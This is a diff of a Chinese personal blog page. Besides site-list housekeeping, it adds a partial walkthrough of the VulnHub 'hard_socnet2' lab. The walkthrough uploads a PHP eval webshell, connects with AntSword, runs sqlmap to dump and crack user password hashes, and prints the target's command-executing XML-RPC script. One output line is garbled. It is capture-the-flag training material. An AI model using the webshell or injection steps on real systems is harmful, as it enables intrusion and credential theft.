@@ -76,7 +76,7 @@
     <li>
         <div class="all active" data-rel="All">All
             
-                <small>(89)</small>
+                <small>(88)</small>
             
         </div>
     </li>
@@ -190,20 +190,6 @@
                         
                         技术研究
                         <small>(7)</small>
-                        
-                    </div>
-                    
-                </li>
-            
-        
-    
-        
-            
-                <li>
-                    <div data-rel="健身">
-                        
-                        健身
-                        <small>(1)</small>
                         
                     </div>
                     
@@ -579,7 +565,7 @@
         
     </div>
 </div>
-<input type="hidden" id="yelog_site_posts_number" value="89">
+<input type="hidden" id="yelog_site_posts_number" value="88">
 
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
@@ -645,6 +631,24 @@
         
         
         <a  class="All "
+           href="/2024/06/22/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-EvilBox/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="红队打靶之VulnHub_EvilBox">红队打靶之VulnHub_EvilBox</span>
+            <span class="post-date" title="2024-06-22 09:55:56">2024/06/22</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/06/21/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-W1R3S/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="红队打靶之VulnHub_W1R3S">红队打靶之VulnHub_W1R3S</span>
+            <span class="post-date" title="2024-06-21 20:35:00">2024/06/21</span>
+        </a>
+        
+        
+        <a  class="All "
            href="/2024/06/20/%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-hard-socnet2/"
            data-tag=""
            data-author="" >
@@ -704,33 +708,6 @@
            data-author="" >
             <span class="post-title" title="BurpSuite学习">BurpSuite学习</span>
             <span class="post-date" title="2023-09-06 15:34:11">2023/09/06</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/08/12/%E6%8B%8D%E7%85%A7%E6%8A%80%E5%B7%A7/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="拍照技巧">拍照技巧</span>
-            <span class="post-date" title="2023-08-12 03:14:34">2023/08/12</span>
-        </a>
-        
-        
-        <a  class="All "
-           href="/2023/08/11/%E7%A9%BF%E6%90%AD/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="穿搭">穿搭</span>
-            <span class="post-date" title="2023-08-11 23:47:23">2023/08/11</span>
-        </a>
-        
-        
-        <a  class="All 健身 "
-           href="/2023/08/10/%E8%85%B0%E9%83%A8%E7%A0%94%E7%A9%B6/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="腰部研究">腰部研究</span>
-            <span class="post-date" title="2023-08-10 01:04:12">2023/08/10</span>
         </a>
         
         
@@ -1465,7 +1442,7 @@
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2024-06-20 20:44:17'>2024-06-20 14:31</time>
+            Created At : <time class="date" title='Updated At: 2024-06-21 17:40:26'>2024-06-20 14:31</time>
         
     </div>
     <div class="article-meta">
@@ -1487,7 +1464,7 @@
     
     <div class="toc-ref">
     
-        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E4%B8%8A%E7%BA%BF"><span class="toc-text">蚁剑上线</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sql注入</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1509,18 +1486,58 @@
 <p>打靶目标: 取得 root 权限</p>
 <p>参考链接: </p>
 <p><a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3/library/xmlrpc.html">https://docs.python.org/zh-cn/3/library/xmlrpc.html</a></p>
+
+
+
+
 <p>涉及攻击方法:</p>
-<p>主机发现</p>
-<p>端口扫描</p>
-<p>SQL注入</p>
-<p>文件上传</p>
-<p>蚁剑上线</p>
 <p>CVE-2021-3493</p>
 <p>XMLRPC</p>
 <p>逆向工程</p>
 <p>动态调试</p>
 <p>缓冲区溢出</p>
 <p>漏洞利用代码编写</p>
+<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-hard-socnet2%5C1.png"></p>
+<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>#<a target="_blank" rel="noopener" href="https://www.yuque.com/antswordproject/antsword/mqgcsn">https://www.yuque.com/antswordproject/antsword/mqgcsn</a>  蚁剑使用手册</p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-hard-socnet2%5C2.png"></p>
+<p>新创建一个webshell文件并上传</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[&#x27;ant&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="蚁剑上线"><a href="#蚁剑上线" class="headerlink" title="蚁剑上线"></a>蚁剑上线</h1><p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-hard-socnet2%5C3.png"></p>
+<p>拿下shell</p>
+<h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><p>bp抓包 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">vi r   # 新文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sqlmap -r r -p query</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>sqlmap -r r -p query –dbs</p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-hard-socnet2%5C8.png"></p>
+<p>sqlmap -r r -p query -D socialnetwork –tables</p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-hard-socnet2%5C9.png"></p>
+<p>sqlmap -r r -p query -D socialnetwork -T users –columns</p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-hard-socnet2%5C10.png"></p>
+<p>sqlmap -r r -p query -D socialnetwork -T users -C user_password,user_email –dump</p>
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-hard-socnet2%5C11.png"></p>
+<p>看到一堆hash</p>
+<p>自动帮我们解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">4 entries]</span><br><span class="line">+---------------------------------------------+------------------------+</span><br><span class="line">| user_password                               | user_email             |</span><br><span class="line">+---------------------------------------------+------------------------+</span><br><span class="line">| 202cb962ac59075b964b07152d234b70 (123)      | admin@1.com            |</span><br><span class="line">| 202cb962ac59075b964b07152d234b70 (123)      | admin@123.com          |</span><br><span class="line">| 21232f297a57a5a743894a0e4a801fc3 (admin)    | admin@localhost.com    |</span><br><span class="line">| 5d9c68c6c50ed3d02a2fcf54f63993b6 (testuser) | testuser@localhost.com |</span><br><span class="line">+---------------------------------------------+------------------------+</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> lsb——release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Ubuntu 18.04.1 LTSDescription:</span><br><span class="line">18.04</span><br><span class="line">Release:</span><br><span class="line">codename :bionica.natalugr&#x27;uhtm]idsts/imgnocinrofi1gc)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/.com//%E7%BA%A2%E9%98%9F%E6%89%93%E9%9D%B6%E4%B9%8BVulnHub-hard-socnet2%5C12.png"></p>
+<p>查看一下 monitor.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">my remote server management API                                                                                                                                             </span><br><span class="line">import SimpleXMLRPCServer                                                                                                                                            </span><br><span class="line">import subprocess                                                                                                                                                  </span><br><span class="line">import random                                                                                                                                     </span><br><span class="line">debugging_pass = random.randint(1000,9999)                                                                                                           </span><br><span class="line">def runcmd(cmd):                                                                                                                                                             </span><br><span class="line">    results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)                                               </span><br><span class="line">    output = results.stdout.read() + results.stderr.read()                                                                                                        </span><br><span class="line">    return output                                                                                                                                              </span><br><span class="line">def cpu():</span><br><span class="line">    return runcmd(&quot;cat /proc/cpuinfo&quot;)</span><br><span class="line">def mem():</span><br><span class="line">    return runcmd(&quot;free -m&quot;)</span><br><span class="line"></span><br><span class="line">def disk():</span><br><span class="line">    return runcmd(&quot;df -h&quot;)</span><br><span class="line"></span><br><span class="line">def net():</span><br><span class="line">    return runcmd(&quot;ip a&quot;)</span><br><span class="line"></span><br><span class="line">def secure_cmd(cmd,passcode):</span><br><span class="line">    if passcode==debugging_pass:</span><br><span class="line">         return runcmd(cmd)</span><br><span class="line">    else:</span><br><span class="line">        return &quot;Wrong passcode.&quot;</span><br><span class="line">server = SimpleXMLRPCServer.SimpleXMLRPCServer((&quot;0.0.0.0&quot;, 8000))</span><br><span class="line">server.register_function(cpu)</span><br><span class="line">server.register_function(mem)</span><br><span class="line">server.register_function(disk)</span><br><span class="line">server.register_function(net)</span><br><span class="line">server.register_function(secure_cmd)</span><br><span class="line">server.serve_forever()</span><br></pre></td></tr></table></figure>
+
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
